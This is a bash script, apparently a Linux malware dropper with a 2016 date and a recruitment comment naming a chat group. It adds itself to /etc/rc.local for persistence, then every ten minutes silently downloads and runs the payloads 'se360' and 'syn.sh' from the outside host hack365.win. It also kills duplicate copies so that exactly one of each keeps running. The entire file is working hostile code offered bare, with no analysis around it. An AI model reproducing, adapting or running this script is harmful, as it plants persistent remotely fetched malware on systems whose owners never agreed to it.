#!/bin/bash
#Welcome like-minded friends to come to exchange.
#We are a group of people who have a dream.
#                qun:10776622
#                2016-06-14

if [ "sh /etc/chongfu.sh &" = "$(cat /etc/rc.local | grep /etc/chongfu.sh | grep -v grep)" ]; then
    echo ""
else
    echo "sh /etc/chongfu.sh &" >> /etc/rc.local
fi

while [ 1 ]; do
    Centos_sshd_killn=$(ps aux | grep "/tmp/se360" | grep -v grep | wc -l)
    if [[ $Centos_sshd_killn -eq 0 ]]; then
        if [ ! -f "/tmp/se360" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P . http://www.hack365.win:7788/se360
                ./wget -P /tmp/  http://www.hack365.win:7788/se360 &> /dev/null
                chmod 755 /tmp/se360
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/se360 &
        #./se360 &
    elif [[ $Centos_sshd_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "se360" | grep -v grep | awk '{print $2}'); do
            Centos_sshd_killn=$(($Centos_sshd_killn-1))
            if [[ $Centos_sshd_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/syn.sh" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/syn.sh" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P .  http://www.hack365.win:7788/syn.sh
                ./wget -P /tmp/  http://www.hack365.win:7788/syn.sh &> /dev/null
                chmod 755 /tmp/syn.sh
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/syn.sh &
        #./syn.sh &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "syn.sh" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    sleep 600
done

